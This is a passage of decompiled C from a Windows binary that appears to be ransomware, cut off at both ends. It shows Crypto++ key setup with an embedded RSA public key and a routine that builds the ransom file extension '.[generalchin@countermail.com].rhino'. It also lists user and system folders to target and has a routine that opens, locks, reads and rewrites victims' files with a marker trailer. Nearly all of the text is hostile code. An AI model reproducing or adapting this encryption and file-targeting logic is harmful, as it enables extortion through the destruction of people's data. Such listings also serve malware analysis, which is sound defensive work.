  LOBYTE(v9) = 1;
  sub_41EB56(this, v4);
  sub_40967A(&v8);
  v7 = &CryptoPP::NameValuePairs::`vftable';
  sub_406E8A((int)v6);
  return this;
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 46CBD0: using guessed type void *CryptoPP::StringStore::`vftable';
// 46CC88: using guessed type void *CryptoPP::StringStore::`vftable';
// 406DE8: using guessed type _DWORD var_34[7];

//----- (00406E6D) --------------------------------------------------------
void *__thiscall sub_406E6D(void *Block, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00406E8A) --------------------------------------------------------
void __thiscall sub_406E8A(int this)
{
  unsigned int v1; // edx
  void *v2; // esi

  v1 = *(_DWORD *)(this + 20);
  v2 = *(void **)(this + 24);
  if ( *(_DWORD *)(this + 16) < v1 )
    v1 = *(_DWORD *)(this + 16);
  memset(*(void **)(this + 24), 0, v1);
  j_j___free_base(v2);
}

//----- (00406EE5) --------------------------------------------------------
int __thiscall sub_406EE5(void *this, char a2, int a3)
{
  int result; // eax

  result = (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 28))(this, a3);
  if ( a2 )
    return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 196))(this, 1);
  return result;
}

//----- (00406F0A) --------------------------------------------------------
_DWORD *__thiscall sub_406F0A(_DWORD *this, char *Src, char a3, int a4)
{
  _DWORD *v5; // eax
  char *v6; // eax
  _DWORD v8[7]; // [esp+4h] [ebp-38h] BYREF
  void **v9; // [esp+20h] [ebp-1Ch] BYREF
  _DWORD v10[3]; // [esp+24h] [ebp-18h] BYREF
  int v11; // [esp+38h] [ebp-4h]

  v10[2] = this;
  sub_408661(this, a4);
  v11 = 0;
  *this = &CryptoPP::StringSource::`vftable';
  this[1] = &CryptoPP::StringSource::`vftable';
  v5 = sub_406A26(v8, Src, 0);
  LOBYTE(v11) = 1;
  v6 = sub_4096C6((char *)&v9, (int)"InputBuffer", (int)v5, 1);
  LOBYTE(v11) = 2;
  sub_406EE5(this, a3, (int)v6);
  sub_40967A(v10);
  v9 = &CryptoPP::NameValuePairs::`vftable';
  sub_406E8A((int)v8);
  return this;
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 46E35C: using guessed type void *CryptoPP::StringSource::`vftable';
// 46E42C: using guessed type void *CryptoPP::StringSource::`vftable';
// 406F0A: using guessed type _DWORD var_38[7];

//----- (00406F92) --------------------------------------------------------
_DWORD *__thiscall sub_406F92(_DWORD *this, void *Src, int Size, int a4, int a5)
{
  _DWORD *v6; // eax
  char *v7; // eax
  _DWORD v9[7]; // [esp+8h] [ebp-38h] BYREF
  void **v10; // [esp+24h] [ebp-1Ch] BYREF
  _DWORD v11[3]; // [esp+28h] [ebp-18h] BYREF
  int v12; // [esp+3Ch] [ebp-4h]

  v11[2] = this;
  sub_408661(this, a5);
  v12 = 0;
  *this = &CryptoPP::StringSource::`vftable';
  this[1] = &CryptoPP::StringSource::`vftable';
  v6 = sub_406A82(v9, Src, Size, 0);
  LOBYTE(v12) = 1;
  v7 = sub_4096C6((char *)&v10, (int)"InputBuffer", (int)v6, 1);
  LOBYTE(v12) = 2;
  sub_406EE5(this, 1, (int)v7);
  sub_40967A(v11);
  v10 = &CryptoPP::NameValuePairs::`vftable';
  sub_406E8A((int)v9);
  return this;
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 46E35C: using guessed type void *CryptoPP::StringSource::`vftable';
// 46E42C: using guessed type void *CryptoPP::StringSource::`vftable';
// 406F92: using guessed type _DWORD var_38[7];

//----- (0040701C) --------------------------------------------------------
_DWORD *__thiscall sub_40701C(_DWORD *Block, char a2)
{
  sub_4086B6(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00407043) --------------------------------------------------------
void *__thiscall sub_407043(void *this, void *a2)
{
  _DWORD *v2; // eax
  int *v3; // eax
  char v5[4]; // [esp+0h] [ebp-24h] BYREF
  char v6[20]; // [esp+4h] [ebp-20h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v2 = (_DWORD *)(*(int (__thiscall **)(void *, char *))(*(_DWORD *)this + 4))(this, v5);
  v7 = 0;
  v3 = sub_40ED4C(v2);
  sub_40E80A(a2, v3);
  sub_40891D((int)v6);
  return a2;
}
// 407043: using guessed type char var_24[4];
// 407043: using guessed type char var_20[20];

//----- (00407086) --------------------------------------------------------
void *__thiscall sub_407086(void *this, void *a2)
{
  _DWORD *v2; // eax
  int *v3; // eax
  char v5[4]; // [esp+0h] [ebp-24h] BYREF
  char v6[20]; // [esp+4h] [ebp-20h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v2 = (_DWORD *)(*(int (__thiscall **)(void *, char *))(*(_DWORD *)this + 8))(this, v5);
  v7 = 0;
  v3 = sub_40ED4C(v2);
  sub_40E80A(a2, v3);
  sub_40891D((int)v6);
  return a2;
}
// 407086: using guessed type char var_24[4];
// 407086: using guessed type char var_20[20];

//----- (004070C9) --------------------------------------------------------
int __thiscall sub_4070C9(void *this, int a2, int a3, int a4)
{
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 28))(this, a2, a4);
  return a2;
}

//----- (004070DE) --------------------------------------------------------
int __stdcall sub_4070DE(int a1, int a2, int a3, int a4, int a5, char a6)
{
  return sub_40C483(a1, a2, a3, a4, a5, 0, 0, a6, 0);
}

//----- (00407104) --------------------------------------------------------
char __stdcall sub_407104(int a1)
{
  char v1; // dl
  int v2; // ecx

  v1 = 0;
  v2 = 0;
  while ( *(_BYTE *)(a1 + v2) == aEncodingparame[v2] )
  {
    if ( ++v2 == 19 )
      return 1;
  }
  return v1;
}

//----- (00407143) --------------------------------------------------------
char __stdcall sub_407143(int a1)
{
  sub_40B07B(a1);
  return 0;
}

//----- (00407155) --------------------------------------------------------
char __stdcall sub_407155(int *a1)
{
  sub_40B450(a1);
  return 0;
}

//----- (00407167) --------------------------------------------------------
_DWORD *__thiscall sub_407167(_DWORD *Block, char a2)
{
  int v3; // eax

  v3 = Block[1];
  *Block = &CryptoPP::X509PublicKey::`vftable';
  *(_DWORD *)((char *)Block + *(_DWORD *)(v3 + 4) + 4) = &CryptoPP::X509PublicKey::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 46CE98: using guessed type void *CryptoPP::X509PublicKey::`vftable';
// 46CEC0: using guessed type void *CryptoPP::X509PublicKey::`vftable';

//----- (00407198) --------------------------------------------------------
void *__thiscall sub_407198(int *this, void *a2)
{
  sub_40E80A(a2, this + 3);
  return a2;
}

//----- (004071AE) --------------------------------------------------------
char __thiscall sub_4071AE(_DWORD *this)
{
  *this = &CryptoPP::AutoSeededRandomPool::`vftable';
  return sub_4071E4(this);
}
// 47F158: using guessed type void *CryptoPP::AutoSeededRandomPool::`vftable';

//----- (004071B9) --------------------------------------------------------
_DWORD *__thiscall sub_4071B9(_DWORD *Block, char a2)
{
  *Block = &CryptoPP::AutoSeededRandomPool::`vftable';
  sub_4071E4(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 47F158: using guessed type void *CryptoPP::AutoSeededRandomPool::`vftable';

//----- (004071E4) --------------------------------------------------------
char __thiscall sub_4071E4(_DWORD *this)
{
  int v2; // ecx
  unsigned int v3; // edx
  unsigned int v4; // esi
  char *v5; // edi
  char *v6; // eax

  sub_405EEF(this + 30);
  sub_4083AF((int)(this + 14));
  v2 = (int)(this + 2);
  v3 = this[11];
  v4 = this[10];
  v5 = *(char **)(v2 + 40);
  v6 = (char *)(v2 + (-v2 & 0xF));
  if ( v5 == v6 )
  {
    *(_BYTE *)(v2 + 25) = 0;
    if ( v4 < v3 )
      v3 = v4;
    LOBYTE(v6) = 0;
    memset(v5, 0, v3);
  }
  return (char)v6;
}

//----- (0040720A) --------------------------------------------------------
_DWORD *__thiscall sub_40720A(_DWORD *this, int a2, int a3, int a4)
{
  char *v5; // eax
  void *v6; // eax
  char v8[4]; // [esp+8h] [ebp-1Ch] BYREF
  _DWORD v9[3]; // [esp+Ch] [ebp-18h] BYREF
  int v10; // [esp+20h] [ebp-4h]

  v9[2] = this;
  sub_41D430(this, 0);
  v10 = 0;
  *this = &CryptoPP::BaseN_Decoder::`vftable';
  this[1] = &CryptoPP::BaseN_Decoder::`vftable';
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  this[9] = 0;
  this[10] = 0;
  this[11] = 0;
  this[13] = -1;
  this[14] = 0;
  this[15] = 0;
  LOBYTE(v10) = 1;
  sub_41D8CB(this, a4);
  v5 = sub_40970F(v8, (int)"DecodingLookupArray", &a2, 1);
  LOBYTE(v10) = 2;
  v6 = (void *)sub_409BCC((int)v5, (int)"Log2Base", &a3, v5[8]);
  sub_423D30(this, v6);
  sub_40967A(v9);
  return this;
}
// 46E43C: using guessed type void *CryptoPP::BaseN_Decoder::`vftable';
// 46E500: using guessed type void *CryptoPP::BaseN_Decoder::`vftable';
// 40720A: using guessed type char var_1C[4];

//----- (004072B2) --------------------------------------------------------
void *__thiscall sub_4072B2(void *Block, char a2)
{
  sub_4072D4((int)Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (004072D4) --------------------------------------------------------
int __thiscall sub_4072D4(int this)
{
  unsigned int v2; // ecx
  void *v3; // edx

  v2 = *(_DWORD *)(this + 56);
  v3 = *(void **)(this + 60);
  if ( *(_DWORD *)(this + 52) < v2 )
    v2 = *(_DWORD *)(this + 52);
  memset(*(void **)(this + 60), 0, v2);
  j_j___free_base(v3);
  return sub_405EEF((_DWORD *)(this + 12));
}

//----- (00407324) --------------------------------------------------------
_DWORD *__thiscall sub_407324(_DWORD *this, int a2)
{
  void *v3; // eax
  _DWORD *result; // eax

  v3 = sub_41F1DE();
  sub_40720A(this, (int)v3, 4, a2);
  *this = &CryptoPP::HexDecoder::`vftable';
  result = this;
  this[1] = &CryptoPP::HexDecoder::`vftable';
  return result;
}
// 46E510: using guessed type void *CryptoPP::HexDecoder::`vftable';
// 46E5D4: using guessed type void *CryptoPP::HexDecoder::`vftable';

//----- (00407355) --------------------------------------------------------
int *__thiscall sub_407355(int this)
{
  _DWORD *v2; // ebx
  int *v3; // edi
  void **v4; // ebx
  int v5; // edx
  void *v6; // esi
  int v7; // edx
  int v8; // eax
  void **v9; // esi
  unsigned int *v10; // eax
  int *v11; // esi
  unsigned int *v12; // edi
  unsigned int *v13; // ebx
  void *v15[2]; // [esp+Ch] [ebp-38h] BYREF
  int Src[4]; // [esp+14h] [ebp-30h] BYREF
  void *v17; // [esp+24h] [ebp-20h] BYREF
  int v18; // [esp+28h] [ebp-1Ch]
  int v19; // [esp+2Ch] [ebp-18h]
  int *v20; // [esp+30h] [ebp-14h]
  int v21; // [esp+34h] [ebp-10h] BYREF
  int v22; // [esp+40h] [ebp-4h]

  v20 = (int *)this;
  *(_DWORD *)this = 0;
  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)(this + 8) = 0;
  v2 = (_DWORD *)(this + 12);
  v22 = 0;
  v21 = this + 12;
  sub_401C9F(this + 12, &unk_47D3F4);
  v2[6] = 0;
  v2[7] = 0;
  v2[8] = 0;
  v2[9] = 0;
  *(_BYTE *)(this + 56) = 1;
  *(_DWORD *)(this + 52) = &FilterFile::`vftable';
  *(_DWORD *)(this + 60) = 0;
  *(_DWORD *)(this + 64) = 0;
  *(_DWORD *)(this + 68) = 0;
  *(_DWORD *)(this + 72) = 0;
  *(_DWORD *)(this + 76) = 0;
  *(_DWORD *)(this + 80) = 0;
  *(_BYTE *)(this + 88) = 1;
  *(_DWORD *)(this + 84) = &FilterDir::`vftable';
  *(_DWORD *)(this + 92) = 0;
  *(_DWORD *)(this + 96) = 0;
  *(_DWORD *)(this + 100) = 0;
  *(_BYTE *)(this + 108) = 1;
  *(_DWORD *)(this + 104) = &WorkerFile::`vftable';
  *(_WORD *)(this + 132) = 12;
  *(_DWORD *)(this + 120) = 0;
  *(_DWORD *)(this + 124) = 0;
  *(_DWORD *)(this + 128) = 0;
  *(_WORD *)(this + 134) = 0;
  *(_DWORD *)(this + 136) = 0;
  *(_DWORD *)(this + 140) = 0;
  *(_DWORD *)(this + 144) = 0;
  *(_DWORD *)(this + 148) = 0;
  *(_DWORD *)(this + 152) = 0;
  v3 = (int *)(this + 156);
  *(_DWORD *)(this + 156) = 0;
  *(_DWORD *)(this + 160) = 0;
  *(_DWORD *)(this + 164) = 0;
  *(_DWORD *)(this + 168) = 0;
  *(_DWORD *)(this + 172) = 0;
  *(_DWORD *)(this + 176) = 0;
  *(_DWORD *)(this + 180) = 0;
  *(_DWORD *)(this + 184) = 0;
  *(_DWORD *)(this + 188) = 0;
  v4 = (void **)(this + 192);
  *(_DWORD *)(this + 208) = 0;
  *(_DWORD *)(this + 212) = 7;
  *(_WORD *)(this + 192) = 0;
  LOBYTE(v22) = 9;
  memmove((void *)(this + 136), aMarvel, 8u);
  sub_402C5F();
  Src[0] = 252316162;
  Src[1] = 201327111;
  Src[2] = 17696264;
  Src[3] = 34278925;
  v17 = 0;
  v18 = 0;
  v19 = 0;
  sub_402653((int *)&v17, v5, 0x10u);
  v6 = v17;
  memmove(v17, Src, 0x10u);
  v21 = 0;
  v18 = (int)v6 + 16;
  sub_40262C(&v21);
  v21 = 1;
  LOBYTE(v22) = 10;
  sub_402954(v3, v7, (int *)&v17);
  sub_401B42((int)&v17);
  sub_402C5F();
  LOBYTE(v22) = 11;
  v8 = sub_401C9F((int)v15, L".[");
  v21 = 3;
  v9 = (void **)v8;
  sub_401C17(v15, L"generalchin@countermail.com");
  sub_401C17(v15, L"].rhino");
  sub_401C3E(v4, v9);
  LOBYTE(v22) = 9;
  unknown_libname_3(v15);
  sub_402C5F();
  v10 = sub_40171E((unsigned int *)&v17);
  v11 = v20;
  v12 = v10;
  v13 = (unsigned int *)(v20 + 15);
  if ( v20 + 15 != (int *)v10 )
  {
    sub_401CF5(v20 + 15);
    *v13 = *v12;
    v13[1] = v12[1];
    v13[2] = v12[2];
    *v12 = 0;
    v12[1] = 0;
    v12[2] = 0;
  }
  sub_401CF5(&v17);
  sub_401B65(v11 + 18, dword_48CCD4);
  sub_4078A8(v11);
  v11[10] = (int)(v11 + 21);
  v11[9] |= 2u;
  v11[11] = (int)(v11 + 13);
  v11[12] = (int)(v11 + 26);
  if ( (unsigned int)((v11[2] - *v11) / 24) < 0x1388 )
    sub_409370(v11, 24);
  return v11;
}
// 4074A3: variable 'v5' is possibly undefined
// 4074DD: variable 'v7' is possibly undefined
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);
// 47E4AC: using guessed type wchar_t aGeneralchinCou[28];
// 47E4E4: using guessed type wchar_t asc_47E4E4[3];
// 47E4EC: using guessed type wchar_t aRhino[8];
// 47EA18: using guessed type void *FilterFile::`vftable';
// 47EA40: using guessed type void *WorkerFile::`vftable';
// 47EA78: using guessed type void *FilterDir::`vftable';
// 48CCD4: using guessed type _DWORD dword_48CCD4[6];

//----- (004075CF) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
char __usercall sub_4075CF@<al>(int a1@<ecx>, int a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  int v5; // edi
  _DWORD *v6; // eax
  unsigned int v7; // esi
  unsigned int v8; // eax
  int v9; // esi
  _DWORD v12[14]; // [esp+0h] [ebp-120h] BYREF
  int v13[32]; // [esp+38h] [ebp-E8h] BYREF
  int v14[3]; // [esp+B8h] [ebp-68h] BYREF
  int v15; // [esp+C4h] [ebp-5Ch] BYREF
  int v16[16]; // [esp+C8h] [ebp-58h] BYREF
  void *Block; // [esp+108h] [ebp-18h]
  int v18; // [esp+10Ch] [ebp-14h]
  int v19; // [esp+11Ch] [ebp-4h]

  v16[14] = a2;
  v18 = a1;
  sub_424445(v13);
  v19 = 0;
  v13[0] = (int)&CryptoPP::AutoSeededRandomPool::`vftable';
  sub_41F193(v13, 0, 0x20u);
  v5 = a1 + 168;
  v19 = 1;
  sub_402842((const void **)v5, 0x20u);
  sub_40D2A4(v13, *(_DWORD *)v5, *(_DWORD *)(v5 + 4) - *(_DWORD *)v5);
  Block = operator new(0x40u);
  LOBYTE(v19) = 2;
  v6 = sub_407324(Block, 0);
  LOBYTE(v19) = 1;
  sub_406F0A(
    v12,
    "30820120300D06092A864886F70D01010105000382010D00308201080282010100AC1B6A1004852D843D4E6AE1D950786FDCCE68346EF77B169A"
    "A9B4189A55A939A2CC22EB856BB6E7237AFFB2499B9B34B7694621279B96A6C95DAAD113FCAFD7C704F0B4812BB388ED310A1F3C7507A74FF541"
    "D73E87B1AD74AC2D8B79800685D354125C29120C370E21755AE096A214FE3DF2DBC894295517E660789913C269A071B98FDA2F1152E8B56C2D4B"
    "75C8E63B0B176EE3206115DE0504663177E3ED966E1A2C6F0CCB970CD2E62C5AF936F4A6BB4A63C9C302E507A8858BF63AE2FB7CC8EE6FB6BC3E"
    "7883B085F11516FF3FD70AD50A93F9FC8C654B0CECBD337A75EEA145903758769FF14A6C64E479EE15E60FBB66961A2AADF1FF9582F014A0E5020111",
    1,
    (int)v6);
  LOBYTE(v19) = 3;
  sub_408BF1(v14);
  LOBYTE(v19) = 4;
  (*(void (__thiscall **)(int *, _DWORD *, int, int))(v16[0] + 4))(v16, v12, a3, a4);
  LOBYTE(v19) = 5;
  v7 = *(_DWORD *)(v5 + 4) - *(_DWORD *)v5;
  if ( v7 > (*(int (__thiscall **)(int *))(v14[0] + 20))(v14) )
    v8 = 0;
  else
    v8 = (*(int (__thiscall **)(int *))(v14[0] + 16))(v14);
  v9 = v18;
  sub_402842((const void **)(v18 + 180), v8);
  sub_40C21E(v14, (int)v13, *(_DWORD *)v5, *(_DWORD *)(v5 + 4) - *(_DWORD *)v5, *(_DWORD *)(v9 + 180), (int)&off_48CD80);
  sub_408EE7(&v15);
  sub_4086B6(v12);
  return sub_4071E4(v13);
}
// 407686: bad sp value at call
// 407698: bad sp value at call
// 4076A5: bad sp value at call
// 4076D8: bad sp value at call
// 4076E0: bad sp value at call
// 4076F2: bad sp value at call
// 407707: bad sp value at call
// 47F158: using guessed type void *CryptoPP::AutoSeededRandomPool::`vftable';
// 48CD80: using guessed type int (__thiscall **off_48CD80)(void *Block, char);
// 4075CF: using guessed type _DWORD var_120[14];

//----- (00407733) --------------------------------------------------------
int __thiscall sub_407733(const void **this)
{
  int v1; // edi
  char *v2; // ebx
  char *v3; // esi
  __int64 v4; // rax
  int i; // ebx
  WCHAR *v6; // eax
  int v7; // ecx
  _DWORD *v8; // esi
  int v9; // eax
  void **v10; // eax
  int v11; // edi
  void *v13[6]; // [esp+Ch] [ebp-50h] BYREF
  _DWORD v14[6]; // [esp+24h] [ebp-38h] BYREF
  const void **v15; // [esp+3Ch] [ebp-20h]
  int v16; // [esp+40h] [ebp-1Ch]
  int v17; // [esp+44h] [ebp-18h]
  int v18; // [esp+48h] [ebp-14h]
  int v19; // [esp+4Ch] [ebp-10h]
  int v20; // [esp+58h] [ebp-4h]

  v1 = (int)this;
  v14[5] = 7;
  v15 = this;
  v14[4] = 0;
  LOWORD(v14[0]) = 0;
  v20 = 0;
  v2 = (char *)this[1];
  v3 = (char *)*this;
  v4 = (_BYTE *)v15[1] - (_BYTE *)*v15;
  v19 = 24;
  v18 = 0;
  if ( (unsigned int)(v4 / 24) )
  {
    for ( i = 0; ; i = v16 )
    {
      v6 = (WCHAR *)&v3[i];
      if ( *(_DWORD *)&v3[i + 20] >= 8u )
        v6 = *(WCHAR **)v6;
      if ( sub_407A5E((const void **)v1, v6) )
      {
        v8 = (_DWORD *)(i + *(_DWORD *)v1);
        v9 = sub_404EAD(v8, v7, v7);
        if ( v9 != -1 )
        {
          v10 = sub_401B9B(v8, v13, 0, v9);
          if ( v14 != v10 )
          {
            LOBYTE(v17) = 0;
            std::wstring::_Move_assign(v10, v17);
          }
          unknown_libname_3(v13);
          sub_4081F9(v14);
        }
      }
      v3 = *(char **)v1;
      v16 = v19 + i;
      v2 = *(char **)(v1 + 4);
      if ( ++v18 >= (unsigned int)((v2 - v3) / v19) )
        break;
    }
  }
  if ( v3 != v2 )
  {
    v11 = v19;
    do
    {
      unknown_libname_3(v3);
      v3 += v11;
    }
    while ( v3 != v2 );
    v1 = (int)v15;
    v3 = (char *)*v15;
  }
  *(_DWORD *)(v1 + 4) = v3;
  return unknown_libname_3(v14);
}
// 4077A2: variable 'v7' is possibly undefined
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);
// 401F48: using guessed type _DWORD __stdcall std::wstring::_Move_assign(_DWORD, _DWORD);

//----- (0040782F) --------------------------------------------------------
void __thiscall sub_40782F(int this, void *Src)
{
  const WCHAR **v3; // esi
  const WCHAR *v4; // eax
  WCHAR String1[310]; // [esp+4h] [ebp-26Ch] BYREF

  if ( Src )
  {
    v3 = (const WCHAR **)(this + 12);
    *(_DWORD *)(this + 112) = this;
    sub_401DB6((void **)(this + 12), Src);
    memset(String1, 0, sizeof(String1));
    v4 = (const WCHAR *)(this + 12);
    if ( *(_DWORD *)(this + 32) >= 8u )
      v4 = *v3;
    lstrcpyW(String1, v4);
    PathAddBackslashW(String1);
    sub_409EBF((_DWORD *)(this + 12), String1);
    sub_407733((const void **)this);
  }
}

//----- (004078A8) --------------------------------------------------------
int __thiscall sub_4078A8(int *this)
{
  int *v1; // ebx
  int v2; // edi
  _DWORD *v3; // esi
  unsigned int v4; // esi
  int v5; // eax
  WCHAR *v6; // eax
  unsigned int v7; // esi
  int v8; // eax
  WCHAR Buffer[50]; // [esp+Ch] [ebp-C0h] BYREF
  void *v11[2]; // [esp+70h] [ebp-5Ch]
  int v12[6]; // [esp+78h] [ebp-54h] BYREF
  void *v13[6]; // [esp+90h] [ebp-3Ch] BYREF
  WCHAR v14[2]; // [esp+A8h] [ebp-24h] BYREF
  int v15; // [esp+B8h] [ebp-14h]
  unsigned int v16; // [esp+BCh] [ebp-10h]
  int v17; // [esp+C8h] [ebp-4h]

  v15 = 0;
  v16 = 7;
  v14[0] = 0;
  v17 = 0;
  v1 = this + 23;
  v2 = dword_48CCCC;
  v3 = dword_48CCC8;
  if ( dword_48CCC8 != (void *)dword_48CCCC )
  {
    do
    {
      sub_401B65(v1, v3);
      v3 += 6;
    }
    while ( v3 != (_DWORD *)v2 );
  }
  v15 = 0;
  v14[0] = 0;
  sub_40A3CD(L"USERPROFILE", v14);
  v11[0] = L"\\AppData\\Local";
  v4 = 0;
  v11[1] = L"\\AppData\\LocalLow";
  v12[0] = (int)L"\\AppData\\Roaming\\Microsoft";
  v12[1] = (int)L"\\Documents";
  v12[2] = (int)L"\\Videos";
  v12[3] = (int)L"\\Pictures";
  v12[4] = (int)L"\\Music";
  v12[5] = (int)L"\\Desktop";
  do
  {
    v5 = sub_405A3F((int)v13, v14, (char *)v11[v4]);
    LOBYTE(v17) = 1;
    sub_407A35(v1, v5);
    LOBYTE(v17) = 0;
    unknown_libname_3(v13);
    ++v4;
  }
  while ( v4 < 8 );
  v15 = 0;
  v6 = v14;
  if ( v16 >= 8 )
    v6 = *(WCHAR **)v14;
  *v6 = 0;
  memset(Buffer, 0, sizeof(Buffer));
  GetEnvironmentVariableW(L"SYSTEMDRIVE", Buffer, 0x32u);
  sub_401DB6((void **)v14, Buffer);
  v13[0] = L"\\Intel";
  v7 = 0;
  v13[1] = L"\\msys32";
  v13[2] = L"\\Qt";
  v13[3] = L"\\ProgramData";
  v13[4] = L"\\Program Files";
  v13[5] = L"\\Windows";
  do
  {
    v8 = sub_405A3F((int)v12, v14, (char *)v13[v7]);
    LOBYTE(v17) = 2;
    sub_407A35(v1, v8);
    LOBYTE(v17) = 0;
    unknown_libname_3(v12);
    ++v7;
  }
  while ( v7 < 6 );
  return unknown_libname_3(v14);
}
// 407900: conditional instruction was optimized away because edx.4==7
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);
// 47EB44: using guessed type wchar_t aDocuments[11];
// 47EB5C: using guessed type wchar_t aVideos[8];
// 47EB6C: using guessed type wchar_t aPictures[10];
// 47EB80: using guessed type wchar_t aMusic[7];
// 47EB90: using guessed type wchar_t aDesktop[9];
// 47EF28: using guessed type wchar_t aAppdataLocal[15];
// 47EF48: using guessed type wchar_t aAppdataLocallo[18];
// 47EF6C: using guessed type wchar_t aAppdataRoaming[27];
// 47EFBC: using guessed type wchar_t aIntel[7];
// 47EFCC: using guessed type wchar_t aMsys32[8];
// 47EFDC: using guessed type wchar_t aQt[4];
// 47EFE4: using guessed type wchar_t aProgramdata[13];
// 47F000: using guessed type wchar_t aProgramFiles[15];
// 47F020: using guessed type wchar_t aWindows[9];
// 48CCCC: using guessed type int dword_48CCCC;

//----- (00407A35) --------------------------------------------------------
int __thiscall sub_407A35(int *this, int a2)
{
  int result; // eax

  if ( this[1] == this[2] )
    return sub_409758(this, this[1], a2);
  result = std::wstring::wstring(a2);
  this[1] += 24;
  return result;
}
// 401C6C: using guessed type _DWORD __stdcall std::wstring::wstring(_DWORD);

//----- (00407A5E) --------------------------------------------------------
char __thiscall sub_407A5E(const void **this, WCHAR *lpFileName)
{
  wchar_t *v2; // ebx
  int FileW; // esi
  DWORD FileSize; // edi
  const void **v5; // edi
  const void **v6; // ecx
  DWORD v7; // ecx
  int v8; // ecx
  int v9; // eax
  int v10; // edx
  int v11; // edi
  char *v12; // edx
  LPCVOID *v13; // esi
  unsigned int v14; // eax
  LPCVOID *v15; // edi
  LPCVOID *v16; // ecx
  char v17; // al
  LPCVOID *v19; // eax
  HANDLE v20; // esi
  BOOL v21; // eax
  int v22; // eax
  const wchar_t *v23; // eax
  char v24[24]; // [esp+Ch] [ebp-80h] BYREF
  LPCVOID v25[4]; // [esp+24h] [ebp-68h] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+34h] [ebp-58h]
  unsigned int v27; // [esp+38h] [ebp-54h]
  LPCVOID v28; // [esp+3Ch] [ebp-50h] BYREF
  void *v29; // [esp+40h] [ebp-4Ch]
  wchar_t *NewFileName[6]; // [esp+48h] [ebp-44h] BYREF
  DWORD nNumberOfBytesToUnlockLow; // [esp+60h] [ebp-2Ch]
  DWORD nNumberOfBytesToUnlockHigh; // [esp+64h] [ebp-28h]
  DWORD FileSizeHigh; // [esp+68h] [ebp-24h] BYREF
  DWORD v34; // [esp+6Ch] [ebp-20h]
  const void **v35; // [esp+70h] [ebp-1Ch]
  DWORD v36; // [esp+74h] [ebp-18h]
  HANDLE hFile; // [esp+78h] [ebp-14h] BYREF
  bool v38; // [esp+7Eh] [ebp-Eh]
  int v39; // [esp+7Fh] [ebp-Dh] BYREF
  int v40; // [esp+88h] [ebp-4h]

  v35 = this;
  v2 = 0;
  v40 = 0;
  FileW = (int)CreateFileW(lpFileName, 0xC0000000, 1u, 0, 3u, 0x80u, 0);
  hFile = (HANDLE)FileW;
  if ( FileW == -1 )
    return (char)v2;
  FileSize = GetFileSize((HANDLE)FileW, &FileSizeHigh);
  if ( FileSize != -1 || !GetLastError() )
  {
    v36 = FileSize;
    v34 = FileSizeHigh;
    nNumberOfBytesToUnlockLow = FileSize + 280;
    nNumberOfBytesToUnlockHigh = __CFADD__(FileSize, 280) + FileSizeHigh;
    v38 = LockFile((HANDLE)FileW, 0, 0, FileSize + 280, nNumberOfBytesToUnlockHigh);
    memset(NewFileName, 0, sizeof(NewFileName));
    if ( SetFilePointerEx((HANDLE)FileW, (LARGE_INTEGER)-24i64, 0, 2u) )
    {
      if ( sub_40A8AC(&hFile, NewFileName, 0x18u)
        && (NewFileName[4] != *(wchar_t **)aMarvel
         || NewFileName[5] != *(wchar_t **)&aMarvel[4]
         || LOWORD(NewFileName[3]) != 12)
        && sub_40A85E(&hFile, 0) )
      {
        v5 = v35 + 36;
        v6 = v35 + 36;
        v35[37] = v35[36];
        sub_402842(v6, 0x3200000u);
        v7 = 52428800;
        FileSizeHigh = 52428800;
        if ( !v34 && v36 <= 0x3200000 )
        {
          v7 = v36;
          FileSizeHigh = v36;
        }
        if ( sub_40A8AC(&hFile, (LPVOID)*v5, v7) )
        {
          sub_402842(v5, FileSizeHigh);
          v9 = sub_407FFF((int)*v5, v8);
          v10 = (int)v35;
          nNumberOfBytesToWrite = 0;
          v27 = 15;
          LOBYTE(v25[0]) = 0;
          v35[32] = (const void *)v9;
          v11 = v10 + 180;
          *(_WORD *)(v10 + 134) = *(_WORD *)(v10 + 184) - *(_WORD *)(v10 + 180);
          *(_DWORD *)(v10 + 120) = v36;
          *(_DWORD *)(v10 + 124) = v34;
          LOBYTE(v40) = 1;
          if ( !sub_407DF2(v10, 0, v10 + 180, FileW, (int)v25) )
          {
LABEL_31:
            unknown_libname_5(v25);
            goto LABEL_32;
          }
          sub_40299C(&v28, (char *)v11);
          LOBYTE(v40) = 2;
          sub_402842(&v28, (_BYTE *)v29 - (_BYTE *)v28 + 24);
          qmemcpy((char *)v28 + *(_DWORD *)(v11 + 4) - *(_DWORD *)v11, v35 + 30, 0x18u);
          if ( v34 || v36 >= 0x3200000 )
          {
            if ( !sub_40A85E(&hFile, 2u)
              || !sub_40A887(&hFile, v28, (_BYTE *)v29 - (_BYTE *)v28)
              || !sub_40A85E(&hFile, 0) )
            {
              goto LABEL_29;
            }
            v19 = v25;
            if ( v27 >= 0x10 )
              v19 = (LPCVOID *)v25[0];
            if ( !sub_40A887(&hFile, v19, nNumberOfBytesToWrite) )
              goto LABEL_29;
          }
          else
          {
            if ( !sub_40A85E(&hFile, 0) )
            {
LABEL_29:
              FileW = (int)hFile;
LABEL_30:
              sub_401B42((int)&v28);
              goto LABEL_31;
            }
            v12 = 0;
            memset(&NewFileName[3], 0, 12);
            LOBYTE(v40) = 3;
